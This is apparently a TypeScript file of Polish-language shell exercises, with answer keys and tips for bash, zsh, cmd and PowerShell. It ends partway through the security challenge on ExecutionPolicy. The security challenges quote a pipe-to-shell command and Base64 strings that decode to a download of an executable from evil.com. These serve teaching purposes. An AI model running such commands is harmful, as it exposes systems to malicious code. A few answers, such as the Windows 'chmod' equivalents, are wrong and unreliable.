import { Challenge, ChallengeEvaluationResult, ShellType } from "../types";

export const CHALLENGES: Challenge[] = [
  // 1. create-dir
  {
    id: "create-dir",
    title: "📁 Tworzenie nowego katalogu",
    goal: "Utwórz nowy podkatalog o nazwie 'projekty' w bieżącej ścieżce",
    description: "Zadaniem jest założenie nowego, pustego katalogu (folderu) o nazwie 'projekty' w Twoim bieżącym katalogu roboczym.",
    level: "podstawowa",
    solutions: {
      bash: ["mkdir projekty", "mkdir \"projekty\"", "mkdir 'projekty'"],
      zsh: ["mkdir projekty", "mkdir \"projekty\"", "mkdir 'projekty'"],
      cmd: ["mkdir projekty", "md projekty", "mkdir \"projekty\""],
      powershell: [
        "New-Item -ItemType Directory -Name \"projekty\"",
        "New-Item -ItemType Directory projekty",
        "mkdir projekty",
        "md projekty"
      ]
    },
    tips: "W systemach Unix oraz Windows standardem jest polecenie 'mkdir'. W PowerShellu kanonicznym cmdletem obiektowym jest 'New-Item' z parametrem -ItemType Directory."
  },
  // 2. change-dir
  {
    id: "change-dir",
    title: "🚀 Nawigacja: Wejście do katalogu",
    goal: "Przejdź do podfolderu o nazwie 'projekty'",
    description: "Zmień bieżący katalog roboczy terminala na podfolder 'projekty', który znajduje się bezpośrednio w aktualnej lokalizacji.",
    level: "podstawowa",
    solutions: {
      bash: ["cd projekty", "cd \"projekty\"", "cd 'projekty'"],
      zsh: ["cd projekty", "cd \"projekty\"", "cd 'projekty'"],
      cmd: ["cd projekty", "cd \"projekty\""],
      powershell: ["Set-Location projekty", "cd projekty", "Set-Location \"projekty\""]
    },
    tips: "Uniwersalne polecenie 'cd' (Change Directory) służy do przechodzenia do podkatalogów. W PowerShellu oficjalną komendą jest Set-Location."
  },
  // 3. cd-parent
  {
    id: "cd-parent",
    title: "🔙 Powrót do folderu wyżej",
    goal: "Cofnij się do katalogu nadrzędnego (rodzica)",
    description: "Musisz przemieścić się o jeden poziom w górę w strukturze drzewa folderów (do folderu nadrzędnego).",
    level: "podstawowa",
    solutions: {
      bash: ["cd ..", "cd ../"],
      zsh: ["cd ..", "cd ../"],
      cmd: ["cd ..", "cd.."],
      powershell: ["Set-Location ..", "cd ..", "Set-Location ../"]
    },
    tips: "Dwie kropki '..' oznaczają katalog nadrzędny we wszystkich popularnych powłokach systemowych."
  },
  // 4. list-dir
  {
    id: "list-dir",
    title: "📂 Wyświetlanie zawartości katalogu",
    goal: "Wyświetl listę wszystkich plików i folderów wraz ze szczegółami i plikami ukrytymi",
    description: "Wyświetl pełną, szczegółową listę elementów w bieżącym katalogu roboczym. Upewnij się, że na liście znajdą się również pliki ukryte.",
    level: "podstawowa",
    solutions: {
      bash: ["ls -la", "ls -a -l", "ls -al", "ls -laF"],
      zsh: ["ls -la", "ls -al", "ls -a -l", "ls -laF"],
      cmd: ["dir /a", "dir /a:h", "dir /ah"],
      powershell: ["Get-ChildItem -Force", "gci -Force", "ls -Force", "dir -Force"]
    },
    tips: "W systemach POSIX (Linux/macOS) użyj ls z flagami -la. W CMD dir potrzebuje /a (atrybuty). W PowerShellu Get-ChildItem wymaga przełącznika -Force."
  },
  // 5. current-path
  {
    id: "current-path",
    title: "📍 Ścieżka bieżąca",
    goal: "Wyświetl pełną ścieżkę do aktualnego katalogu roboczego",
    description: "Wypisz na ekran terminala pełną bezwzględną ścieżkę wskazującą, w jakim dokładnie folderze aktualnie się znajdujesz.",
    level: "podstawowa",
    solutions: {
      bash: ["pwd"],
      zsh: ["pwd"],
      cmd: ["cd"],
      powershell: ["Get-Location", "pwd", "gl"]
    },
    tips: "W systemach Unix służy do tego skrót 'pwd' (print working directory). W CMD samo wpisanie 'cd' bez parametrów zwraca ścieżkę. W PowerShellu cmdletem jest Get-Location."
  },
  // 6. create-empty-file
  {
    id: "create-empty-file",
    title: "📝 Tworzenie pustego pliku",
    goal: "Utwórz nowy, pusty plik tekstowy o nazwie 'notatka.txt'",
    description: "Szybko utwórz nowy pusty plik o nazwie 'notatka.txt' bezpośrednio z konsoli bez otwierania żadnego programu graficznego.",
    level: "podstawowa",
    solutions: {
      bash: ["touch notatka.txt", "touch \"notatka.txt\""],
      zsh: ["touch notatka.txt", "touch \"notatka.txt\""],
      cmd: ["type nul > notatka.txt", "echo. > notatka.txt", "type nul > \"notatka.txt\""],
      powershell: [
        "New-Item -ItemType File -Name \"notatka.txt\"",
        "New-Item -ItemType File notatka.txt",
        "touch notatka.txt"
      ]
    },
    tips: "W Linux/macOS standardem jest 'touch'. W CMD używa się przekierowania pustego strumienia 'type nul > notatka.txt'. W PowerShellu skorzystaj z New-Item z parametrem -ItemType File."
  },
  // 7. copy-file
  {
    id: "copy-file",
    title: "📄 Kopiowanie plików",
    goal: "Skopiuj plik 'zrodlo.txt' do pliku 'kopia.txt'",
    description: "Wykonaj kopię istniejącego pliku 'zrodlo.txt' i nazwij nowo utworzony plik 'kopia.txt' w tej samej lokalizacji.",
    level: "podstawowa",
    solutions: {
      bash: ["cp zrodlo.txt kopia.txt", "cp \"zrodlo.txt\" \"kopia.txt\""],
      zsh: ["cp zrodlo.txt kopia.txt", "cp \"zrodlo.txt\" \"kopia.txt\""],
      cmd: ["copy zrodlo.txt kopia.txt", "copy \"zrodlo.txt\" \"kopia.txt\""],
      powershell: ["Copy-Item zrodlo.txt kopia.txt", "cp zrodlo.txt kopia.txt", "copy zrodlo.txt kopia.txt"]
    },
    tips: "W Linux/macOS użyj 'cp'. W CMD skorzystaj z 'copy'. W PowerShellu kanoniczny cmdlet to 'Copy-Item'."
  },
  // 8. move-rename
  {
    id: "move-rename",
    title: "✏️ Zmiana nazwy pliku",
    goal: "Zmień nazwę pliku 'stary.txt' na 'nowy.txt'",
    description: "Zmień nazwę pliku tekstowego 'stary.txt' znajdującego się w bieżącym katalogu na 'nowy.txt'.",
    level: "podstawowa",
    solutions: {
      bash: ["mv stary.txt nowy.txt", "mv \"stary.txt\" \"nowy.txt\""],
      zsh: ["mv stary.txt nowy.txt", "mv \"stary.txt\" \"nowy.txt\""],
      cmd: ["move stary.txt nowy.txt", "ren stary.txt nowy.txt", "rename stary.txt nowy.txt"],
      powershell: ["Move-Item stary.txt nowy.txt", "mv stary.txt nowy.txt", "Rename-Item stary.txt nowy.txt"]
    },
    tips: "W systemach Unix jedno uniwersalne polecenie 'mv' (move) odpowiada za przenoszenie i zmianę nazwy. W CMD masz 'move' lub 'ren'. W PowerShellu używa się 'Move-Item' lub 'Rename-Item'."
  },
  // 9. delete-file
  {
    id: "delete-file",
    title: "🗑️ Usuwanie plików",
    goal: "Usuń plik 'dane.csv' ze swojego dysku",
    description: "Bezpowrotnie usuń niepotrzebny plik 'dane.csv' z bieżącego katalogu roboczego.",
    level: "podstawowa",
    solutions: {
      bash: ["rm dane.csv", "rm \"dane.csv\""],
      zsh: ["rm dane.csv", "rm \"dane.csv\""],
      cmd: ["del dane.csv", "erase dane.csv", "del \"dane.csv\""],
      powershell: ["Remove-Item dane.csv", "rm dane.csv", "del dane.csv"]
    },
    tips: "Służy do tego polecenie 'rm' (POSIX), 'del' (CMD) lub 'Remove-Item' (PowerShell)."
  },
  // 10. open-default
  {
    id: "open-default",
    title: "🖥️ Otwieranie pliku w programie domyślnym",
    goal: "Otwórz plik 'index.html' w domyślnej przeglądarce/aplikacji systemowej",
    description: "Wyślij sygnał do systemu operacyjnego, aby otworzył plik 'index.html' w programie, który jest domyślnie przypisany do rozszerzenia .html.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["xdg-open index.html", "xdg-open \"index.html\""],
      zsh: ["open index.html", "open \"index.html\""],
      cmd: ["start index.html", "start \"\" \"index.html\""],
      powershell: ["Start-Process \"index.html\"", "start index.html", "ii index.html", "Invoke-Item index.html"]
    },
    tips: "Każdy system ma tu swoją własną komendę: Linux (xdg-open), macOS (open), CMD (start), PowerShell (Start-Process lub Invoke-Item)."
  },
  // 11. cat-file
  {
    id: "cat-file",
    title: "📖 Odczyt zawartości pliku",
    goal: "Wyświetl pełną zawartość tekstową pliku 'logi.txt'",
    description: "Wypisz całą treść zapisaną w pliku tekstowym 'logi.txt' bezpośrednio na ekran terminala.",
    level: "podstawowa",
    solutions: {
      bash: ["cat logi.txt", "cat \"logi.txt\""],
      zsh: ["cat logi.txt", "cat \"logi.txt\""],
      cmd: ["type logi.txt", "type \"logi.txt\""],
      powershell: ["Get-Content logi.txt", "cat logi.txt", "type logi.txt", "gc logi.txt"]
    },
    tips: "Klasyczne polecenie w systemach Unix to 'cat'. W Windows CMD odpowiednikiem jest 'type', a w PowerShellu 'Get-Content'."
  },
  // 12. tail
  {
    id: "tail",
    title: "🔍 Śledzenie końcówki logów",
    goal: "Wyświetl dokładnie 10 ostatnich linii pliku 'serwer.log'",
    description: "Wypisz na ekran tylko 10 ostatnich linijek z pliku 'serwer.log', co jest niezwykle przydatne przy analizie świeżych błędów w logach.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["tail -n 10 serwer.log", "tail -10 serwer.log", "tail -n10 serwer.log"],
      zsh: ["tail -n 10 serwer.log", "tail -10 serwer.log", "tail -n10 serwer.log"],
      cmd: ["powershell Get-Content serwer.log -Tail 10", "powershell -Command \"Get-Content serwer.log -Tail 10\""],
      powershell: ["Get-Content serwer.log -Tail 10", "gc serwer.log -Tail 10", "Get-Content \"serwer.log\" -Tail 10"]
    },
    tips: "W systemach POSIX użyj narzędzia 'tail' z flagą -n. CMD nie ma natywnej komendy, więc można wywołać PowerShellowe Get-Content z parametrem -Tail."
  },
  // 13. search-text
  {
    id: "search-text",
    title: "🔎 Wyszukiwanie tekstu",
    goal: "Wyszukaj w pliku 'serwer.log' linie zawierające słowo 'ERROR'",
    description: "Przeszukaj plik tekstowy 'serwer.log' i wyświetl na ekranie tylko te wiersze, w których występuje wielkimi literami fraza 'ERROR'.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["grep \"ERROR\" serwer.log", "grep 'ERROR' serwer.log", "grep ERROR serwer.log"],
      zsh: ["grep \"ERROR\" serwer.log", "grep 'ERROR' serwer.log", "grep ERROR serwer.log"],
      cmd: ["findstr \"ERROR\" serwer.log", "findstr ERROR serwer.log"],
      powershell: [
        "Select-String -Pattern \"ERROR\" serwer.log",
        "Select-String 'ERROR' serwer.log",
        "Select-String ERROR serwer.log",
        "sls \"ERROR\" serwer.log"
      ]
    },
    tips: "W Bash i Zsh niezastąpiony jest 'grep'. W CMD używa się 'findstr'. W PowerShellu idealnie pasuje cmdlet 'Select-String'."
  },
  // 14. write-text
  {
    id: "write-text",
    title: "✍️ Zapisywanie tekstu (nadpisywanie)",
    goal: "Zapisz tekst 'Witaj Swiecie' do pliku 'info.txt'",
    description: "Utwórz plik 'info.txt' (lub nadpisz istniejący) wprowadzając do niego jako jedyną treść tekst 'Witaj Swiecie'.",
    level: "podstawowa",
    solutions: {
      bash: ["echo \"Witaj Swiecie\" > info.txt", "echo 'Witaj Swiecie' > info.txt", "echo Witaj Swiecie > info.txt"],
      zsh: ["echo \"Witaj Swiecie\" > info.txt", "echo 'Witaj Swiecie' > info.txt", "echo Witaj Swiecie > info.txt"],
      cmd: ["echo Witaj Swiecie > info.txt", "echo \"Witaj Swiecie\" > info.txt"],
      powershell: [
        "\"Witaj Swiecie\" | Out-File info.txt",
        "Set-Content -Path info.txt -Value \"Witaj Swiecie\"",
        "echo \"Witaj Swiecie\" > info.txt",
        "\"Witaj Swiecie\" > info.txt"
      ]
    },
    tips: "Użycie operatora przekierowania '>' to klasyczna metoda nadpisywania plików tekstowych we wszystkich konsolach systemowych."
  },
  // 15. count-lines
  {
    id: "count-lines",
    title: "🔢 Liczenie wierszy w pliku",
    goal: "Oblicz i wypisz całkowitą liczbę linii w pliku 'plik.txt'",
    description: "Sprawdź, z ilu linii tekstu składa się plik tekstowy 'plik.txt' i wypisz ten wynik.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["wc -l plik.txt", "wc -l < plik.txt"],
      zsh: ["wc -l plik.txt", "wc -l < plik.txt"],
      cmd: ["find /c /v \"\" plik.txt", "find /c /v \"\" < plik.txt"],
      powershell: [
        "(Get-Content plik.txt).Length",
        "(Get-Content plik.txt).Count",
        "Get-Content plik.txt | Measure-Object -Line"
      ]
    },
    tips: "W systemach Unix stosuje się polecenie 'wc -l' (word count lines). W CMD stosuje się trik z poleceniem find z flagami /c (count) i /v (odwrócone wyszukiwanie pustego ciągu). W PowerShellu można pobrać tablicę linii i sprawdzić jej właściwość .Length."
  },
  // 16. clipboard-copy
  {
    id: "clipboard-copy",
    title: "📋 Kopiowanie tekstu do schowka",
    goal: "Przekieruj słowo 'tekst' bezpośrednio do schowka systemowego",
    description: "Skopiuj ciąg znaków 'tekst' prosto do schowka, tak abyś mógł go wkleić w dowolnej innej aplikacji za pomocą skrótu Ctrl+V.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["echo \"tekst\" | xclip -sel clip", "echo tekst | xclip -selection clipboard", "echo -n \"tekst\" | xclip -sel clip"],
      zsh: ["echo \"tekst\" | pbcopy", "echo -n \"tekst\" | pbcopy", "echo tekst | pbcopy"],
      cmd: ["echo tekst | clip", "echo \"tekst\" | clip"],
      powershell: ["echo \"tekst\" | Set-Clipboard", "\"tekst\" | Set-Clipboard", "Set-Clipboard -Value \"tekst\""]
    },
    tips: "W macOS służy do tego 'pbcopy', w Linuxie 'xclip', w CMD 'clip', a w PowerShellu 'Set-Clipboard'."
  },
  // 17. whoami
  {
    id: "whoami",
    title: "👤 Kim jestem?",
    goal: "Sprawdź nazwę obecnie zalogowanego użytkownika",
    description: "Wypisz nazwę aktywnego konta użytkownika, na którym aktualnie pracujesz w tej sesji terminala.",
    level: "podstawowa",
    solutions: {
      bash: ["whoami"],
      zsh: ["whoami"],
      cmd: ["whoami"],
      powershell: ["whoami", "$env:USERNAME"]
    },
    tips: "Polecenie 'whoami' to uniwersalna komenda działająca dokładnie tak samo na wszystkich platformach systemowych."
  },
  // 18. clear-screen
  {
    id: "clear-screen",
    title: "🧹 Czyszczenie ekranu",
    goal: "Wyczyść okno konsoli ze starego tekstu",
    description: "Wyczyść cały bufor ekranu terminala, aby kursor powrócił na samą górę, a widok był całkowicie czysty.",
    level: "podstawowa",
    solutions: {
      bash: ["clear"],
      zsh: ["clear"],
      cmd: ["cls"],
      powershell: ["Clear-Host", "cls", "clear"]
    },
    tips: "W systemach Unix wpisz 'clear', w Windows CMD 'cls'. PowerShell akceptuje obie formy jako aliasy do Clear-Host."
  },
  // 19. run-python
  {
    id: "run-python",
    title: "🐍 Uruchamianie kodu Python",
    goal: "Uruchom skrypt o nazwie 'program.py' za pomocą interpretera Python",
    description: "Uruchom w konsoli skrypt języka Python zapisany w pliku 'program.py'.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["python3 program.py", "python program.py"],
      zsh: ["python3 program.py", "python program.py"],
      cmd: ["python program.py", "python3 program.py"],
      powershell: ["python program.py", "python3 program.py"]
    },
    tips: "W systemach Linux/macOS domyślna binarka to najczęściej 'python3', natomiast w Windows jest to zwykle po prostu 'python'."
  },
  // 20. chmod
  {
    id: "chmod",
    title: "🔑 Nadawanie praw wykonywania",
    goal: "Nadaj plikowi 'skrypt.sh' uprawnienie do wykonywania (wykonywalny)",
    description: "Zmień uprawnienia pliku 'skrypt.sh', aby system operacyjny traktował go jako program/skrypt, który można bezpośrednio uruchomić.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["chmod +x skrypt.sh", "chmod 755 skrypt.sh", "chmod a+x skrypt.sh"],
      zsh: ["chmod +x skrypt.sh", "chmod 755 skrypt.sh", "chmod a+x skrypt.sh"],
      cmd: ["attrib +r plik.txt"], // analogical for cmd sandbox testing if needed
      powershell: ["Set-Acl skrypt.sh"]
    },
    tips: "W systemach Unix służy do tego polecenie 'chmod' z parametrem '+x' (executable). W systemach Windows uprawnienia są sterowane za pomocą ACL."
  },
  // 21. list-processes
  {
    id: "list-processes",
    title: "📊 Monitor procesów",
    goal: "Wyświetl listę aktualnie działających procesów w systemie",
    description: "Wyświetl wykaz wszystkich aktywnych programów i wątków systemowych, które w danej chwili działają w pamięci operacyjnej.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["ps aux", "ps -ef", "ps"],
      zsh: ["ps aux", "ps -ef", "ps"],
      cmd: ["tasklist"],
      powershell: ["Get-Process", "ps", "gps"]
    },
    tips: "W systemach Unix standardem jest 'ps aux' lub 'ps -ef'. W Windows CMD służy do tego 'tasklist', a w PowerShellu dedykowany 'Get-Process'."
  },
  // 22. kill-process
  {
    id: "kill-process",
    title: "💀 Ubijanie procesu",
    goal: "Wymuś natychmiastowe zakończenie procesu o identyfikatorze PID 1234",
    description: "Zamknij w sposób awaryjny zawieszony proces systemowy o identyfikatorze (PID) równym 1234.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["kill -9 1234", "kill -SIGKILL 1234", "kill -KILL 1234"],
      zsh: ["kill -9 1234", "kill -SIGKILL 1234", "kill -KILL 1234"],
      cmd: ["taskkill /F /PID 1234", "taskkill /f /pid 1234"],
      powershell: ["Stop-Process -Id 1234 -Force", "Stop-Process 1234 -Force", "kill -Id 1234 -Force"]
    },
    tips: "W Linux/macOS użyj 'kill -9' ze wskazaniem PID. W Windows CMD wywołaj 'taskkill /F /PID'. W PowerShellu posłuż się cmdletem 'Stop-Process'."
  },
  // 23. system-info
  {
    id: "system-info",
    title: "ℹ️ Parametry systemu operacyjnego",
    goal: "Wyświetl szczegółowe informacje o specyfikacji systemu i konfiguracji jądra",
    description: "Pobierz i wypisz na ekran główne parametry systemu operacyjnego, wersję jądra oraz podstawowe dane sprzętowe.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["uname -a", "cat /etc/os-release"],
      zsh: ["uname -a"],
      cmd: ["systeminfo"],
      powershell: ["Get-ComputerInfo", "[System.Environment]::OSVersion"]
    },
    tips: "W systemach POSIX służy do tego polecenie 'uname -a'. W CMD wspaniały raport generuje 'systeminfo', a w PowerShellu 'Get-ComputerInfo'."
  },
  // 24. macos-version
  {
    id: "macos-version",
    title: "🍏 Sprawdzanie wersji macOS",
    goal: "Sprawdź dokładną wersję systemu operacyjnego macOS w powłoce Zsh",
    description: "Skorzystaj z dedykowanego narzędzia w systemie macOS do odczytania dokładnego numeru zainstalowanej wersji systemu.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["uname -a"],
      zsh: ["sw_vers"],
      cmd: ["ver"],
      powershell: ["[System.Environment]::OSVersion"]
    },
    tips: "System macOS (będący domyślnym środowiskiem dla powłoki Zsh) posiada specjalną komendę systemową 'sw_vers' do pobierania wersji systemu macOS."
  },
  // 25. ping-host
  {
    id: "ping-host",
    title: "📡 Pingowanie hosta",
    goal: "Przetestuj łączność sieciową wysyłając dokładnie 4 pakiety do 'google.com'",
    description: "Sprawdź, czy Twój komputer ma połączenie z internetem i jaka jest szybkość odpowiedzi wysyłając 4 testowe pakiety ICMP do serwera 'google.com'.",
    level: "podstawowa",
    solutions: {
      bash: ["ping -c 4 google.com", "ping -c4 google.com"],
      zsh: ["ping -c 4 google.com", "ping -c4 google.com"],
      cmd: ["ping google.com", "ping -n 4 google.com"],
      powershell: ["Test-Connection google.com -Count 4", "ping google.com", "Test-Connection google.com"]
    },
    tips: "W Linux/macOS program 'ping' działa bez końca, dlatego należy dodać przełącznik '-c 4'. W Windows CMD domyślnie wysyła 4 pakiety. W PowerShellu oficjalną komendą jest 'Test-Connection'."
  },
  // 26. ip-config
  {
    id: "ip-config",
    title: "🌐 Sprawdzanie adresów IP",
    goal: "Wyświetl adresy IP przypisane do Twoich kart sieciowych",
    description: "Wyświetl szczegółową konfigurację interfejsów sieciowych, w tym przypisane do komputera lokalne adresy IP.",
    level: "podstawowa",
    solutions: {
      bash: ["ip addr show", "ip addr", "ip a"],
      zsh: ["ifconfig", "ip addr show"],
      cmd: ["ipconfig", "ipconfig /all"],
      powershell: ["Get-NetIPAddress", "ipconfig", "Get-NetIPConfiguration"]
    },
    tips: "W systemie Linux standardem jest 'ip addr show', na macOS 'ifconfig', w CMD 'ipconfig', a w PowerShellu 'Get-NetIPAddress'."
  },
  // 27. nslookup
  {
    id: "nslookup",
    title: "🔮 Odpytywanie serwerów DNS",
    goal: "Sprawdź adres IP przypisany do nazwy domeny 'google.com'",
    description: "Dowiedz się, na jaki adres IP tłumaczona jest domena 'google.com' w systemie DNS.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["nslookup google.com"],
      zsh: ["nslookup google.com"],
      cmd: ["nslookup google.com"],
      powershell: ["Resolve-DnsName google.com", "nslookup google.com"]
    },
    tips: "Tradycyjne narzędzie 'nslookup' działa tak samo we wszystkich powłokach. W PowerShellu nowoczesnym odpowiednikiem jest cmdlet 'Resolve-DnsName'."
  },
  // 28. traceroute
  {
    id: "traceroute",
    title: "🛣️ Śledzenie trasy pakietu",
    goal: "Sprawdź trasę pakietów (routery pośrednie) do hosta 'google.com'",
    description: "Prze śledź wszystkie węzły i routery pośrednie, przez które przechodzą pakiety wysłane z Twojego komputera do serwera 'google.com'.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["traceroute google.com"],
      zsh: ["traceroute google.com"],
      cmd: ["tracert google.com"],
      powershell: ["Test-NetConnection google.com -TraceRoute", "tracert google.com"]
    },
    tips: "W Linux/macOS wpisz 'traceroute', w Windows CMD skrócone 'tracert', a w PowerShellu możesz użyć 'Test-NetConnection' z parametrem -TraceRoute."
  },
  // 29. download-file
  {
    id: "download-file",
    title: "📥 Pobieranie plików",
    goal: "Pobierz plik z adresu URL 'https://example.com/plik.zip' bezpośrednio na dysk",
    description: "Pobierz wskazany zasób sieciowy bezpośrednio przy użyciu komend tekstowych.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["curl -O https://example.com/plik.zip", "wget https://example.com/plik.zip"],
      zsh: ["curl -O https://example.com/plik.zip", "wget https://example.com/plik.zip"],
      cmd: ["curl -O https://example.com/plik.zip"],
      powershell: [
        "Invoke-WebRequest -Uri \"https://example.com/plik.zip\" -OutFile \"plik.zip\"",
        "Invoke-WebRequest https://example.com/plik.zip -OutFile plik.zip",
        "curl -O https://example.com/plik.zip"
      ]
    },
    tips: "W systemach Unix najpopularniejsze są 'curl' i 'wget'. W Windows 10/11 w CMD również wbudowano 'curl'. W PowerShellu natywnym cmdletem jest 'Invoke-WebRequest'."
  },
  // 30. set-variable
  {
    id: "set-variable",
    title: "🔑 Tworzenie zmiennej środowiskowej",
    goal: "Ustaw tymczasową zmienną środowiskową 'API_KEY' o wartości 'secret123'",
    description: "Zdefiniuj w bieżącej sesji konsoli zmienną środowiskową o nazwie API_KEY i przypisz jej wartość 'secret123'.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["export API_KEY=secret123", "API_KEY=secret123"],
      zsh: ["export API_KEY=secret123", "API_KEY=secret123"],
      cmd: ["set API_KEY=secret123"],
      powershell: ["$env:API_KEY=\"secret123\"", "$env:API_KEY = 'secret123'"]
    },
    tips: "W systemach Unix używamy słowa kluczowego 'export' lub przypisania bezpośredniego. W CMD służy do tego 'set', a w PowerShellu modyfikujemy specjalny dostawca środowiska '$env:'."
  },
  // 31. get-variable
  {
    id: "get-variable",
    title: "🔑 Odczyt zmiennej środowiskowej",
    goal: "Wyświetl w terminalu wartość zapisanej wcześniej zmiennej 'API_KEY'",
    description: "Odczytaj i wypisz na ekran wartość przypisaną do zmiennej środowiskowej o nazwie API_KEY.",
    level: "ponadpodstawowa",
    solutions: {
      bash: ["echo $API_KEY"],
      zsh: ["echo $API_KEY"],
      cmd: ["echo %API_KEY%"],
      powershell: ["$env:API_KEY", "echo $env:API_KEY"]
    },
    tips: "Zwróć uwagę na składnię odwołań: Bash/Zsh używają znaku '$', CMD otacza zmienną procentami '%', a PowerShell sięga do '$env:'."
  },
  // 32. sec-curl-sh
  {
    id: "sec-curl-sh",
    title: "🛡️ Bezpieczne pobieranie skryptów (Piping to Shell)",
    goal: "Pobierz bezpiecznie skrypt z adresu 'http://example.com/install.sh' i zapisz go jako lokalny plik 'install.sh' zamiast przekazywać go bezpośrednio potokiem do powłoki",
    description: "Zobaczyłeś w internetowej instrukcji polecenie: `curl -s http://example.com/install.sh | bash` lub `iex (iwr http://example.com/install.ps1)`. Jest to skrajnie niebezpieczne. Zidentyfikuj i napraw to zagrożenie: pobierz plik do lokalnego 'install.sh' (w Bash/Zsh/CMD) lub 'install.ps1' (w PowerShell), aby móc go najpierw zweryfikować.",
    level: "ponadpodstawowa",
    category: "bezpieczenstwo",
    solutions: {
      bash: ["curl -sL http://example.com/install.sh -o install.sh", "curl -o install.sh http://example.com/install.sh", "wget http://example.com/install.sh"],
      zsh: ["curl -sL http://example.com/install.sh -o install.sh", "curl -o install.sh http://example.com/install.sh", "wget http://example.com/install.sh"],
      cmd: ["curl -o install.sh http://example.com/install.sh"],
      powershell: [
        "Invoke-WebRequest -Uri http://example.com/install.sh -OutFile install.ps1",
        "Invoke-WebRequest http://example.com/install.sh -OutFile install.ps1",
        "iwr http://example.com/install.sh -OutFile install.ps1"
      ]
    },
    tips: "Zasada ograniczonego zaufania: nigdy nie przesyłaj pobieranej treści bezpośrednio do interpreterów 'bash' czy 'Invoke-Expression' (iex). Najpierw pobierz plik lokalnie za pomocą flagi '-o' (curl) lub '-OutFile' (Invoke-WebRequest) i przejrzyj jego kod.",
    dangerExplanation: "Bezpośrednie przekazywanie pobieranego skryptu z sieci do powłoki (pipe to shell) niesie za sobą ogromne ryzyko wykonania złośliwego kodu (Remote Code Execution - RCE). Atakujący może podmienić zawartość pliku w locie (np. poprzez atak Man-in-the-Middle) lub przejąć serwer, instalując na Twoim komputerze spyware lub ransomware bez żadnej uprzedniej kontroli z Twojej strony."
  },
  // 33. sec-encoded-cmd
  {
    id: "sec-encoded-cmd",
    title: "🔓 Dekodowanie ukrytych poleceń (Base64)",
    goal: "Zdekoduj podejrzany ciąg Base64 i wyświetl wynikowy, czytelny tekst",
    description: "Złośliwe oprogramowanie (malware) często maskuje swoje działanie kodując komendy w Base64 (np. `powershell -EncodedCommand SQB3...`). Masz podejrzany ciąg 'aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl' (Bash) lub 'SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA' (PowerShell - UTF-16LE). Zdekoduj go i wypisz na ekran, aby zobaczyć, co kryje pod spodem.",
    level: "ponadpodstawowa",
    category: "bezpieczenstwo",
    solutions: {
      bash: ["echo \"aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl\" | base64 -d", "echo aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl | base64 --decode"],
      zsh: ["echo \"aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl\" | base64 -d", "echo aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl | base64 --decode"],
      cmd: ["powershell [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA'))"],
      powershell: [
        "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA'))",
        "[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA'))"
      ]
    },
    tips: "W systemach Unix do dekodowania strumieni danych Base64 służy polecenie 'base64 -d'. W PowerShellu, ponieważ flaga '-EncodedCommand' oczekuje kodowania Unicode (UTF-16LE), dekodowanie wymaga użycia klasy '[System.Convert]::FromBase64String()' oraz metody '[System.Text.Encoding]::Unicode.GetString()'.",
    dangerExplanation: "Uruchamianie ukrytych (obfuskowanych) poleceń to powszechna technika stosowana przez złośliwe oprogramowanie (malware/ransomware) do omijania prostych sygnatur antywirusowych (AV) oraz systemów IDS/IPS. Ukrywanie prawdziwej treści komendy utrudnia statyczną analizę bezpieczeństwa oraz audyt logów i pozwala na potajemne pobranie payloadu, kradzież haseł użytkownika czy uszkodzenie plików."
  },
  // 34. sec-exec-policy
  {
    id: "sec-exec-policy",
    title: "🛡️ Blokada złośliwych skryptów i ExecutionPolicy",
    goal: "Zabezpiecz system: odbierz uprawnienia uruchamiania pliku 'malicious.sh' (Linux) lub ustaw bezpieczną politykę uruchamiania skryptów na 'Restricted' (PowerShell)",
    description: "Znalazłeś w systemie niebezpieczny skrypt 'malicious.sh' (w środowisku Linux) lub podejrzewasz, że polityka skryptów w PowerShellu jest zbyt otwarta ('Bypass' / 'Unrestricted'). Zabezpiecz system: odbierz uprawnienia wykonywania skryptu 'malicious.sh' w Bash/Zsh lub zmień politykę ExecutionPolicy na 'Restricted' w PowerShell.",
    level: "ponadpodstawowa",
    category: "bezpieczenstwo",
    solutions: {
